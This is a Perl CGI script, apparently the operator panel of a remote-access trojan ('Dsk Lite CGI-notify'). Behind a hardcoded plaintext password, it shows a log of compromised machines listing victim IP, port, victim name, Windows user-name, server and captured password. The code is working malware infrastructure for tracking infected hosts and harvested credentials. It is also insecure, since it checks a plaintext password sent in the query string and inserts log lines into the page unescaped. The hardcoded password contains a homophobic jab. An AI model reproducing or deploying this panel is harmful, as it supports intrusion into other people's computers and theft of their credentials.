#!/usr/bin/perl 
print "Content-type:text/html\n\n";

#################################################################
#                   Dsk Lite Cgi Logger                         #
#################################################################


$in = $ENV{'QUERY_STRING'};
@in = split(/[&;]/,$in); 
foreach $i (0 .. $#in) {	
  $in[$i] =~ s/\+/ /g;	
  ($key, $val) = split(/=/,$in[$i],2);	
  $key =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $val =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $in{$key} .= "\0" if (defined($in{$key}));	 
  $in{$key} .= $val;
}

 
  $bestand='log.txt';
  $correctpass = "a/vspysaregay";
  $scriptlocation = "http://yoursite/cgi-bin/list.cgi";
  $password = $in{'password'};
  $function = $in{'function'};

open (FILE,"+<$bestand") || die "Can't open $bestand: $!\n"; 
@list = <FILE>;
close(FILE);

@days   = ('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');
($sec,$min,$hour,$mday,$mon,$year,$wday) = (localtime(time))[0,1,2,3,4,5,6];
$time = sprintf("%02d:%02d:%02d",$hour,$min,$sec);
$date = "$days[$wday] $mday, $time";

if ($correctpass eq "")
{
 &show_list;
}

if ($function eq "post") {
      if ($password eq $correctpass) {
          &show_list;
          exit;
       }
      &wrong_password;
   }
 &ask_password;


sub wrong_password {
    print "<HTML>\n";
    print "<HEAD><TITLE>Dsk Lite CGI-notify [invalid password]</Title></HEAD>\n";
    print "<BODY BGCOLOR=#FFFFFF>\n";
    print "<table width=40% cellpadding=1 cellspacing=0  border=1 align=CENTER bgcolor=#404040 bordercolor =#404040><br><br><br>\n";
    print "<center><tr bgcolor=#E0E0F0><td><center><table><font color=#CCCCCC font style=font-size:13 face=Verdana><b>Invalid password, try again:</b></font></table></center></tr></center>\n";
    print "<tr bgcolor=#FFFFFF><td><center><table border=0 cellpadding=4 cellspacing=0><tr><br></tr></table></center>\n";  
    print "<CENTER><FORM ACTION=$scriptlocation>\n";
    print "<INPUT TYPE=password  NAME=password SIZE=30%>\n";
    print "<INPUT TYPE=hidden NAME=function VALUE=post>\n";
    print "<INPUT TYPE=submit VALUE=\"   OK   \">\n";
    print "</FORM></CENTER>\n";
    print "</td></tr></table>\n";   
    print "</BODY></HTML>\n";
    exit;
}

sub ask_password {
   print "<HTML>\n";
    print "<HEAD><TITLE>Dsk Lite CGI-notify [enter password]</Title></HEAD>\n";
    print "<BODY BGCOLOR=#FFFFFF>\n";
    print "<table width=40% cellpadding=1 cellspacing=0  border=1 align=CENTER bgcolor=#404040 bordercolor =#404040><br><br><br>\n";
    print "<center><tr bgcolor=#E0E0F0><td><center><table><font color=#CCCCCC font style=font-size:13 face=Verdana><b>Please enter password:</b></font></table></center></tr></center>\n";
    print "<tr bgcolor=#FFFFFF><td><center><table border=0 cellpadding=4 cellspacing=0><tr><br></tr></table></center>\n";  
    print "<CENTER><FORM ACTION=$scriptlocation>\n";
    print "<INPUT TYPE=password  NAME=password SIZE=30%>\n";
    print "<INPUT TYPE=hidden NAME=function VALUE=post>\n";
    print "<INPUT TYPE=submit VALUE=\"   OK   \">\n";
    print "</FORM></CENTER>\n";
    print "</td></tr></table>\n";   
    print "</BODY></HTML>\n";
    exit;
}


sub show_list {
    print "<HTML>\n";
    print "<HEAD><TITLE>Dsk Lite CGI-notify</Title>\n";
    print "<style type=text/css><!--BODY {SCROLLBAR-FACE-COLOR:#E0E0F0; SCROLLBAR-HIGHLIGHT-COLOR:#404040; SCROLLBAR-SHADOW-COLOR: #404040; SCROLLBAR-ARROW-COLOR:  #FFFFFF; SCROLLBAR-TRACK-COLOR: #E0E0E0; } A:active {COLOR: #2092B0; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A:hover {COLOR: #2092B0; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A:link {COLOR: #FFFFFF; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A {COLOR: #B8A490; FONT-FAMILY: Verdana; TEXT-DECORATION: none} -->\n";
    print "</style></HEAD><body bgcolor=#FFFFFF><center><font style=font-size:13 face=Verdana><b>Dsk Lite CGI-notify - Please do not be destructive !!</b><br><br><hr width=500 align=center>\n";
    print "<br><table border =1 cellpadding =4 cellspacing =0 bgcolor =#E0E0F0 bordercolor = #404040><td><center><font color=#404040 style=font-size:11 face=Courier New, Courier, mono><b>IP</td><td><center><font color=#404040 style=font-size:10 face=Courier New, Courier, mono><b>Port</td><td><center><font color=#404040 style=font-size:10 face=Courier New, Courier, mono><b>Victim name</td><td><center><font color=#404040 style=font-size:10 face=Courier New, Courier, mono><b>Windows user-name</td><td><center><font color=#404040 style=font-size:10 face=Courier New, Courier, mono><b>Server</td><td><center><font color=#404040 style=font-size:10 face=Courier New, Courier, mono><b>Date & Time</td><td><center><font color=#404040 style=font-size:10 face=Courier New, Courier, mono><b>Password</td>@list\n";
    print "</td><div align=right><font color=#404040 style=font-size:10 face=Arial, Helvetica,sans-serif>Server time: $date</font></div></td></table></center><br>\n";
    print "<BODY BGCOLOR=#FFFFFF>\n";
    print "</BODY></HTML>\n";
    exit;
}